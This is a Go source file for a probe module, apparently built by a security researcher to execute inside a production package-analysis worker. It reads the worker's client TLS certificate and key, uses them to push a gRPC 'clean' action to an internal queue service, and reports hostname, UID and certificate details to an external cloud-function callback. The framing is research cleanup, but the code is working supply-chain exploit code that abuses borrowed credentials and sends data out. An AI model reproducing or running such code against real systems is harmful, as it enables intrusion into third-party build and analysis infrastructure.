// Command queue-receipt performs one fixed, researcher-owned Queue cleanup
// action from the exact production Capslock compiler lane and emits bounded
// receipts to one pinned callback.
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var callbackBaseURL string
var callbackSession string
var callbackURLSHA256 string

const (
	moduleName       = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion     = "v0.0.121-codex"
	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.121-codex"
	expectedAgent    = "go-cgo-pkgsite-probe-v121-queue-receipt"
	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.5"
	queueName        = "capslock-capability-result"
	queueSource      = "robert-owned-v121-clean-rollback"
	queueMethod      = "/sos.queue.Queue/Push"
	serviceHost      = "talisman-core.default.svc.cluster.local"
	servicePort      = 9000
	tlsServerName    = "localhost"

	analysisURL        = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.5/analysis"
	cleanSHA256        = "b29cc76a863e9bb78a74e9e417b4914d3c50c9271b928a02e8accd859903a6ec"
	alteredSHA256      = "8fa1ab0a982e0ac97555488c716fb232e1a83cb3214e1be3a71ff22e8a3d9e13"
	expectedPushBytes  = 136
	expectedPushSHA256 = "5fbe64bfe43cc444010a37a6500c7b206d654d34e111c7128bd4ce8b2cabd9f2"

	clientCertificatePath = "/etc/tls/client/tls.crt"
	clientKeyPath         = "/etc/tls/client/tls.key"
	serverPoolPath        = "/etc/tls/server-pool/server-tls-pool.pem"

	precheckSamples    = 5
	cleanSamples       = 21
	pollInterval       = 2 * time.Second
	pollTimeout        = 15 * time.Minute
	callbackTimeout    = 20 * time.Second
	internalTimeout    = 35 * time.Second
	maximumPublic      = 4096
	maximumGRPCBody    = 16 * 1024
	maximumCallback    = 256 * 1024
	maximumPostSamples = 512
)

var uuidPattern = regexp.MustCompile(`[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}`)

type fileMetadata struct {
	Path     string `json:"path"`
	Present  bool   `json:"present"`
	Mode     string `json:"mode,omitempty"`
	Size     int64  `json:"size,omitempty"`
	Readable bool   `json:"readable"`
}

type certificateIdentity struct {
	Present      bool     `json:"present"`
	SHA256       string   `json:"sha256,omitempty"`
	Subject      string   `json:"subject,omitempty"`
	Issuer       string   `json:"issuer,omitempty"`
	DNSNames     []string `json:"dns_names"`
	IPAddresses  []string `json:"ip_addresses"`
	URIs         []string `json:"uris"`
	NotBeforeUTC string   `json:"not_before_utc,omitempty"`
	NotAfterUTC  string   `json:"not_after_utc,omitempty"`
}

type identityReceipt struct {
	Lane       string              `json:"lane"`
	CWD        string              `json:"cwd"`
	UID        int                 `json:"uid"`
	GID        int                 `json:"gid"`
	Hostname   string              `json:"hostname"`
	PID1Comm   string              `json:"pid1_comm"`
	PID1Exe    string              `json:"pid1_exe"`
	TLSFiles   []fileMetadata      `json:"tls_files"`
	ClientCert certificateIdentity `json:"client_certificate"`
}

type publicSample struct {
	Sequence    int    `json:"sequence"`
	ObservedUTC string `json:"observed_utc"`
	HTTPStatus  int    `json:"http_status"`
	ContentType string `json:"content_type"`
	Bytes       int    `json:"bytes"`
	SHA256      string `json:"sha256"`
	State       string `json:"state"`
	Body        string `json:"body,omitempty"`
}

type grpcMetadata struct {
	Present   bool   `json:"present"`
	Values    int    `json:"values,omitempty"`
	RawBytes  int    `json:"raw_bytes,omitempty"`
	RawSHA256 string `json:"raw_sha256,omitempty"`
	Text      string `json:"text,omitempty"`
}

type queueReceipt struct {
	Attempted          bool         `json:"attempted"`
	Method             string       `json:"method"`
	Queue              string       `json:"queue"`
	Source             string       `json:"source"`
	Target             string       `json:"target"`
	RequestBytes       int          `json:"request_bytes"`
	RequestSHA256      string       `json:"request_sha256"`
	HTTPStatus         int          `json:"http_status,omitempty"`
	ContentType        string       `json:"content_type,omitempty"`
	GRPCStatusHeader   grpcMetadata `json:"grpc_status_header"`
	GRPCStatusTrailer  grpcMetadata `json:"grpc_status_trailer"`
	ResponseBytes      int          `json:"response_bytes,omitempty"`
	ResponseSHA256     string       `json:"response_sha256,omitempty"`
	ResponseFrames     int          `json:"response_frames,omitempty"`
	ActionIDCount      int          `json:"action_id_count"`
	ActionIDSHA256     string       `json:"action_id_sha256,omitempty"`
	TargetEchoCount    int          `json:"target_echo_count"`
	TargetEchoVerified bool         `json:"target_echo_verified"`
	Verified           bool         `json:"verified"`
	Error              string       `json:"error,omitempty"`
	StartedUTC         string       `json:"started_utc,omitempty"`
	FinishedUTC        string       `json:"finished_utc,omitempty"`
	DurationMS         int64        `json:"duration_ms,omitempty"`
}

type postcheckReceipt struct {
	Attempted   bool           `json:"attempted"`
	Samples     []publicSample `json:"samples"`
	CleanStreak int            `json:"clean_streak"`
	Converged   bool           `json:"converged"`
	FinalBody   string         `json:"final_body,omitempty"`
	FinalSHA256 string         `json:"final_sha256,omitempty"`
	Error       string         `json:"error,omitempty"`
}

type report struct {
	Schema                string           `json:"schema"`
	Phase                 string           `json:"phase"`
	Module                string           `json:"module"`
	Version               string           `json:"version"`
	Target                string           `json:"target"`
	ExpectedAlteredSHA256 string           `json:"expected_altered_sha256"`
	ExpectedCleanSHA256   string           `json:"expected_clean_sha256"`
	StartedUTC            string           `json:"started_utc"`
	FinishedUTC           string           `json:"finished_utc,omitempty"`
	Identity              identityReceipt  `json:"identity"`
	Precheck              []publicSample   `json:"precheck"`
	PrecheckState         string           `json:"precheck_state"`
	PreflightReportSHA256 string           `json:"preflight_report_sha256,omitempty"`
	Queue                 queueReceipt     `json:"queue"`
	QueueReportSHA256     string           `json:"queue_report_sha256,omitempty"`
	QueueCallbackOK       bool             `json:"queue_callback_ok"`
	Postcheck             postcheckReceipt `json:"postcheck"`
	Outcome               string           `json:"outcome"`
	Error                 string           `json:"error,omitempty"`
}

func main() {
	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	origin := filepath.Clean(os.Args[3])
	if origin != expectedOrigin || origin != os.Args[3] || os.Geteuid() != 0 {
		return
	}
	pid1 := readBoundedText("/proc/1/cmdline", 8192)
	if !strings.Contains(pid1, "talisman-worker-capabilities") {
		return
	}

	started := time.Now()
	receipt := report{
		Schema: "owned-queue-clean-receipt/v1", Phase: "final", Module: moduleName,
		Version: probeVersion, Target: targetCoordinate,
		ExpectedAlteredSHA256: alteredSHA256, ExpectedCleanSHA256: cleanSHA256,
		StartedUTC: started.UTC().Format(time.RFC3339Nano),
		Identity:   inspectIdentity(origin), Precheck: []publicSample{},
		Queue: emptyQueueReceipt(), Postcheck: postcheckReceipt{Samples: []publicSample{}},
	}

	certIdentity, certErr := readClientCertificateIdentity()
	receipt.Identity.ClientCert = certIdentity
	if certErr != nil {
		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "client_certificate_identity_invalid"
		finishAndSubmit(&receipt)
		return
	}

	precheck, state, err := runPrecheck()
	receipt.Precheck, receipt.PrecheckState = precheck, state
	if err != nil {
		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", cleanError(err)
		finishAndSubmit(&receipt)
		return
	}
	if state == "clean" {
		receipt.Outcome = "noop_already_clean"
		finishAndSubmit(&receipt)
		return
	}
	if state != "altered" {
		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "precheck_not_exact_altered"
		finishAndSubmit(&receipt)
		return
	}

	receipt.Phase = "preflight"
	receipt.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	preflightHash, err := submitPhase("preflight", receipt)
	if err != nil {
		receipt.Phase = "final"
		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "preflight_callback_failed"
		finishAndSubmit(&receipt)
		return
	}
	receipt.PreflightReportSHA256 = preflightHash

	receipt.Queue = runQueuePush()
	queueReport := receipt
	queueReport.Phase = "queue"
	queueReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	queueHash, callbackErr := submitPhase("queue", queueReport)
	receipt.QueueReportSHA256 = queueHash
	receipt.QueueCallbackOK = callbackErr == nil

	receipt.Postcheck = runPostcheck()
	if receipt.Queue.Verified && receipt.QueueCallbackOK && receipt.Postcheck.Converged {
		receipt.Outcome = "queue_verified_and_clean_converged"
	} else if receipt.Postcheck.Converged {
		receipt.Outcome = "clean_converged_queue_receipt_incomplete"
		if !receipt.Queue.Verified {
			receipt.Error = "queue_response_not_verified"
		} else {
			receipt.Error = "queue_callback_failed"
		}
	} else {
		receipt.Outcome, receipt.Error = "queue_cleanup_not_converged", firstNonempty(receipt.Queue.Error, receipt.Postcheck.Error)
	}
	finishAndSubmit(&receipt)
}

func emptyQueueReceipt() queueReceipt {
	return queueReceipt{Method: queueMethod, Queue: queueName, Source: queueSource, Target: targetCoordinate}
}

func finishAndSubmit(value *report) {
	value.Phase = "final"
	value.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_, _ = submitPhase("final", *value)
}

func firstNonempty(values ...string) string {
	for _, value := range values {
		if value != "" {
			return value
		}
	}
	return "unknown_failure"
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func validateRuntimeConfiguration() error {
	if !validNonce(callbackSession) || len(callbackURLSHA256) != 64 {
		return errors.New("invalid callback identity")
	}
	parsed, err := url.Parse(callbackBaseURL)
	expectedPath := "/go-cgo-v121-queue-codex/v1/session/" + callbackSession
	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
		parsed.Path != expectedPath {
		return errors.New("callback URL outside fixed shape")
	}
	digest := sha256.Sum256([]byte(callbackBaseURL))
	if hex.EncodeToString(digest[:]) != callbackURLSHA256 {
		return errors.New("callback URL digest mismatch")
	}
	return nil
}

func inspectIdentity(origin string) identityReceipt {
	hostname, _ := os.Hostname()
	result := identityReceipt{
		Lane: "capslock", CWD: origin, UID: os.Geteuid(), GID: os.Getegid(),
		Hostname: boundedText(hostname, 128), PID1Comm: boundedText(strings.TrimSpace(readBoundedText("/proc/1/comm", 256)), 128),
		TLSFiles: []fileMetadata{}, ClientCert: certificateIdentity{DNSNames: []string{}, IPAddresses: []string{}, URIs: []string{}},
	}
	if executable, err := os.Readlink("/proc/1/exe"); err == nil {
		result.PID1Exe = boundedText(executable, 256)
	}
	for _, path := range []string{serverPoolPath, clientCertificatePath, clientKeyPath} {
		item := fileMetadata{Path: path, Readable: syscallAccess(path, 4)}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present, item.Mode, item.Size = true, info.Mode().String(), info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func syscallAccess(path string, mode uint32) bool {
	return syscall.Access(path, mode) == nil
}

func readClientCertificateIdentity() (certificateIdentity, error) {
	result := certificateIdentity{DNSNames: []string{}, IPAddresses: []string{}, URIs: []string{}}
	raw, err := readBoundedFile(clientCertificatePath, 32*1024)
	if err != nil {
		return result, err
	}
	block, _ := pem.Decode(raw)
	if block == nil || block.Type != "CERTIFICATE" {
		return result, errors.New("invalid client certificate PEM")
	}
	certificate, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return result, err
	}
	digest := sha256.Sum256(certificate.Raw)
	result.Present = true
	result.SHA256 = hex.EncodeToString(digest[:])
	result.Subject = boundedText(certificate.Subject.String(), 512)
	result.Issuer = boundedText(certificate.Issuer.String(), 512)
	result.NotBeforeUTC = certificate.NotBefore.UTC().Format(time.RFC3339Nano)
	result.NotAfterUTC = certificate.NotAfter.UTC().Format(time.RFC3339Nano)
	for _, name := range certificate.DNSNames {
		result.DNSNames = append(result.DNSNames, boundedText(name, 256))
	}
	for _, address := range certificate.IPAddresses {
		result.IPAddresses = append(result.IPAddresses, address.String())
	}
	for _, uri := range certificate.URIs {
		result.URIs = append(result.URIs, boundedText(uri.String(), 512))
	}
	return result, nil
}

func runPrecheck() ([]publicSample, string, error) {
	result := make([]publicSample, 0, precheckSamples)
	for sequence := 1; sequence <= precheckSamples; sequence++ {
		sample, err := fetchPublic(sequence)
		result = append(result, sample)
		if err != nil || (sample.State != "clean" && sample.State != "altered") {
			return result, "unknown", errors.New("public_precheck_failed")
		}
		if sequence != precheckSamples {
			time.Sleep(time.Second)
		}
	}
	state, err := classifyPublicSamples(result)
	return result, state, err
}

func classifyPublicSamples(samples []publicSample) (string, error) {
	if len(samples) == 0 {
		return "unknown", errors.New("public_precheck_empty")
	}
	state := samples[0].State
	if state != "clean" && state != "altered" {
		return "unknown", errors.New("public_precheck_failed")
	}
	for _, sample := range samples[1:] {
		if sample.State != "clean" && sample.State != "altered" {
			return "unknown", errors.New("public_precheck_failed")
		}
		if sample.State != state {
			return "mixed", errors.New("public_precheck_mixed")
		}
	}
	return state, nil
}

func runPostcheck() postcheckReceipt {
	result := postcheckReceipt{Attempted: true, Samples: []publicSample{}}
	deadline := time.Now().Add(pollTimeout)
	for sequence := 1; sequence <= maximumPostSamples && time.Now().Before(deadline); sequence++ {
		sample, err := fetchPublic(precheckSamples + sequence)
		result.Samples = append(result.Samples, sample)
		if err != nil || (sample.State != "clean" && sample.State != "altered") {
			result.Error = "public_postcheck_failed"
			return result
		}
		if sample.State == "clean" {
			result.CleanStreak++
			result.FinalBody, result.FinalSHA256 = sample.Body, sample.SHA256
		} else {
			result.CleanStreak = 0
			result.FinalBody, result.FinalSHA256 = "", ""
		}
		if result.CleanStreak >= cleanSamples {
			result.Converged = true
			return result
		}
		time.Sleep(pollInterval)
	}
	result.Error = "public_postcheck_timeout"
	return result
}

func fetchPublic(sequence int) (publicSample, error) {
	result := publicSample{Sequence: sequence, ObservedUTC: time.Now().UTC().Format(time.RFC3339Nano), State: "unknown"}
	parsed, _ := url.Parse(analysisURL)
	query := parsed.Query()
	query.Set("v121_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
	parsed.RawQuery = query.Encode()
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, parsed.String(), nil)
	if err != nil {
		return result, errors.New("public_request_failed")
	}
	request.Header.Set("User-Agent", expectedAgent)
	request.Header.Set("Cache-Control", "no-cache")
	client := publicHTTPClient()
	defer client.CloseIdleConnections()
	response, err := client.Do(request)
	if err != nil {
		return result, errors.New("public_fetch_failed")
	}
	defer response.Body.Close()
	result.HTTPStatus, result.ContentType = response.StatusCode, response.Header.Get("Content-Type")
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPublic+1))
	if err != nil || len(body) == 0 || len(body) > maximumPublic {
		return result, errors.New("public_body_invalid")
	}
	result.Bytes = len(body)
	digest := sha256.Sum256(body)
	result.SHA256 = hex.EncodeToString(digest[:])
	if response.StatusCode != http.StatusOK || result.ContentType != "application/json; charset=utf-8" {
		return result, errors.New("public_response_shape_invalid")
	}
	result.State = publicStateForDigest(result.SHA256)
	if result.State == "unknown" {
		return result, errors.New("public_body_unknown")
	}
	result.Body = string(body)
	return result, nil
}

func publicStateForDigest(value string) string {
	switch value {
	case cleanSHA256:
		return "clean"
	case alteredSHA256:
		return "altered"
	default:
		return "unknown"
	}
}

func publicHTTPClient() *http.Client {
	transport := &http.Transport{Proxy: nil, TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12}}
	return &http.Client{Transport: transport, CheckRedirect: rejectRedirect, Timeout: 15 * time.Second}
}

func appendVarint(target []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	length := binary.PutUvarint(buffer[:], value)
	return append(target, buffer[:length]...)
}

func appendBytesField(target []byte, number int, value []byte) []byte {
	target = appendVarint(target, uint64(number<<3|2))
	target = appendVarint(target, uint64(len(value)))
	return append(target, value...)
}

func appendStringField(target []byte, number int, value string) []byte {
	return appendBytesField(target, number, []byte(value))
}

func grpcFrame(payload []byte) []byte {
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	return append(frame, payload...)
}

func buildCleanPush() []byte {
	metadata := appendStringField(nil, 1, queueName)
	metadata = appendStringField(metadata, 4, queueSource)
	queueRequest := appendBytesField(nil, 1, metadata)
	cleanAction := appendStringField(nil, 1, targetCoordinate)
	result := appendBytesField(nil, 3, cleanAction)
	pushRequest := appendBytesField(nil, 1, result)
	return append(grpcFrame(queueRequest), grpcFrame(pushRequest)...)
}

func runQueuePush() (result queueReceipt) {
	started := time.Now()
	result = emptyQueueReceipt()
	result.Attempted, result.StartedUTC = true, started.UTC().Format(time.RFC3339Nano)
	defer func() {
		result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		result.DurationMS = time.Since(started).Milliseconds()
	}()
	body := buildCleanPush()
	digest := sha256.Sum256(body)
	result.RequestBytes, result.RequestSHA256 = len(body), hex.EncodeToString(digest[:])
	if len(body) != expectedPushBytes || result.RequestSHA256 != expectedPushSHA256 {
		result.Error = "queue_request_pin_mismatch"
		return
	}
	client, endpoint, err := newInternalClient()
	if err != nil {
		result.Error = "internal_client_failed"
		return
	}
	defer client.CloseIdleConnections()
	ctx, cancel := context.WithTimeout(context.Background(), internalTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+queueMethod, bytes.NewReader(body))
	if err != nil {
		result.Error = "queue_request_failed"
		return
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("Grpc-Timeout", "30S")
	request.Header.Set("User-Agent", expectedAgent)
	response, err := client.Do(request)
	if err != nil {
		result.Error = "queue_transport_failed"
		return
	}
	defer response.Body.Close()
	result.HTTPStatus, result.ContentType = response.StatusCode, response.Header.Get("Content-Type")
	result.GRPCStatusHeader = captureGRPCMetadata(response.Header, "Grpc-Status")
	responseBody, err := io.ReadAll(io.LimitReader(response.Body, maximumGRPCBody+1))
	if err != nil || len(responseBody) > maximumGRPCBody {
		result.Error = "queue_response_oversize_or_unreadable"
		return
	}
	result.GRPCStatusTrailer = captureGRPCMetadata(response.Trailer, "Grpc-Status")
	result.ResponseBytes = len(responseBody)
	responseDigest := sha256.Sum256(responseBody)
	result.ResponseSHA256 = hex.EncodeToString(responseDigest[:])
	frames, framesOK := countGRPCFrames(responseBody)
	result.ResponseFrames = frames
	actionIDs := uuidPattern.FindAll(responseBody, -1)
	result.ActionIDCount = len(actionIDs)
	if len(actionIDs) == 1 {
		actionDigest := sha256.Sum256(actionIDs[0])
		result.ActionIDSHA256 = hex.EncodeToString(actionDigest[:])
	}
	result.TargetEchoCount = bytes.Count(responseBody, []byte(targetCoordinate))
	result.TargetEchoVerified = result.TargetEchoCount == 1
	if response.StatusCode != http.StatusOK || strings.TrimSpace(strings.ToLower(result.ContentType)) != "application/grpc" ||
		!exactZeroGRPCStatus(result.GRPCStatusHeader, result.GRPCStatusTrailer) || !framesOK || frames < 1 ||
		result.ActionIDCount != 1 || !result.TargetEchoVerified {
		result.Error = "queue_response_not_exact"
		return
	}
	result.Verified = true
	return
}

func countGRPCFrames(body []byte) (int, bool) {
	count := 0
	for offset := 0; offset < len(body); count++ {
		if len(body)-offset < 5 || body[offset] != 0 {
			return count, false
		}
		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
		offset += 5
		if length < 0 || length > len(body)-offset {
			return count, false
		}
		offset += length
	}
	return count, count > 0
}

func captureGRPCMetadata(header http.Header, name string) grpcMetadata {
	values := []string(nil)
	for key, candidates := range header {
		if strings.EqualFold(key, name) {
			values = append(values, candidates...)
		}
	}
	if values == nil {
		return grpcMetadata{}
	}
	raw := strings.Join(values, "\x00")
	digest := sha256.Sum256([]byte(raw))
	text := raw
	if len(text) > 64 {
		text = text[:64] + "[truncated]"
	}
	return grpcMetadata{Present: true, Values: len(values), RawBytes: len(raw), RawSHA256: hex.EncodeToString(digest[:]), Text: text}
}

func exactZeroGRPCStatus(header, trailer grpcMetadata) bool {
	count := 0
	for _, value := range []grpcMetadata{header, trailer} {
		if value.Present {
			if value.Values != 1 || value.Text != "0" {
				return false
			}
			count++
		}
	}
	return count == 1
}

func newInternalClient() (*http.Client, string, error) {
	certificate, err := tls.LoadX509KeyPair(clientCertificatePath, clientKeyPath)
	if err != nil {
		return nil, "", err
	}
	pemBytes, err := readBoundedFile(serverPoolPath, 64*1024)
	if err != nil {
		return nil, "", err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(pemBytes) {
		return nil, "", errors.New("root pool empty")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
	if err != nil {
		return nil, "", errors.New("fixed internal service did not resolve")
	}
	var selected net.IP
	for _, candidate := range addresses {
		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
			selected = candidate.IP
			break
		}
	}
	if selected == nil {
		return nil, "", errors.New("fixed internal service had no private address")
	}
	dialAddress := net.JoinHostPort(selected.String(), strconv.Itoa(servicePort))
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{certificate}, RootCAs: roots, MinVersion: tls.VersionTLS12,
		ServerName: tlsServerName, InsecureSkipVerify: true,
		VerifyConnection: func(state tls.ConnectionState) error { return verifyInternalPeer(state, roots) },
	}
	dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}
	transport := &http.Transport{
		Proxy: nil, ForceAttemptHTTP2: true, TLSClientConfig: tlsConfig,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, dialAddress)
		},
	}
	endpoint := "https://" + net.JoinHostPort(serviceHost, strconv.Itoa(servicePort))
	return &http.Client{Transport: transport, CheckRedirect: rejectRedirect, Timeout: internalTimeout}, endpoint, nil
}

func verifyInternalPeer(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("internal TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	intermediates := x509.NewCertPool()
	for _, certificate := range state.PeerCertificates[1:] {
		intermediates.AddCert(certificate)
	}
	if _, err := leaf.Verify(x509.VerifyOptions{Roots: roots, Intermediates: intermediates, KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}}); err != nil {
		return err
	}
	if len(leaf.DNSNames) > 0 {
		return leaf.VerifyHostname(tlsServerName)
	}
	if leaf.Subject.CommonName != tlsServerName {
		return errors.New("internal TLS peer identity mismatch")
	}
	return nil
}

func submitPhase(phase string, value report) (string, error) {
	if phase != "preflight" && phase != "queue" && phase != "final" {
		return "", errors.New("invalid callback phase")
	}
	encoded, err := json.Marshal(value)
	if err != nil || len(encoded) == 0 || len(encoded) > maximumCallback {
		return "", errors.New("callback body invalid")
	}
	digest := sha256.Sum256(encoded)
	digestText := hex.EncodeToString(digest[:])
	ctx, cancel := context.WithTimeout(context.Background(), callbackTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, callbackBaseURL+"/"+phase, bytes.NewReader(encoded))
	if err != nil {
		return digestText, err
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", expectedAgent)
	request.Header.Set("X-Codex-Probe-Session", callbackSession)
	client := callbackHTTPClient()
	defer client.CloseIdleConnections()
	response, err := client.Do(request)
	if err != nil {
		return digestText, err
	}
	defer response.Body.Close()
	responseBody, readErr := io.ReadAll(io.LimitReader(response.Body, 4097))
	if response.StatusCode != http.StatusCreated {
		return digestText, fmt.Errorf("callback status %d", response.StatusCode)
	}
	if readErr != nil || len(responseBody) > 4096 || !validCallbackAck(responseBody, phase, digestText) {
		return digestText, errors.New("callback acknowledgement invalid")
	}
	return digestText, nil
}

func validCallbackAck(body []byte, phase, digest string) bool {
	var value map[string]any
	if json.Unmarshal(body, &value) != nil || len(value) != 3 {
		return false
	}
	accepted, acceptedOK := value["accepted"].(bool)
	ackPhase, phaseOK := value["phase"].(string)
	ackDigest, digestOK := value["sha256"].(string)
	return acceptedOK && accepted && phaseOK && ackPhase == phase && digestOK && ackDigest == digest
}

func callbackHTTPClient() *http.Client {
	transport := &http.Transport{Proxy: nil, TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12}}
	return &http.Client{Transport: transport, CheckRedirect: rejectRedirect, Timeout: callbackTimeout}
}

func rejectRedirect(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }

func readBoundedFile(path string, maximum int64) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return nil, errors.New("bounded read failed")
	}
	return value, nil
}

func readBoundedText(path string, maximum int64) string {
	value, err := readBoundedFile(path, maximum)
	if err != nil {
		return ""
	}
	return string(value)
}

func boundedText(value string, maximum int) string {
	value = strings.Map(func(character rune) rune {
		if character < 0x20 || character == 0x7f {
			return ' '
		}
		return character
	}, value)
	if len(value) > maximum {
		value = value[:maximum]
	}
	return value
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	value := err.Error()
	for _, secret := range []string{callbackSession, callbackBaseURL} {
		if secret != "" {
			value = strings.ReplaceAll(value, secret, "[redacted]")
		}
	}
	return boundedText(value, 256)
}
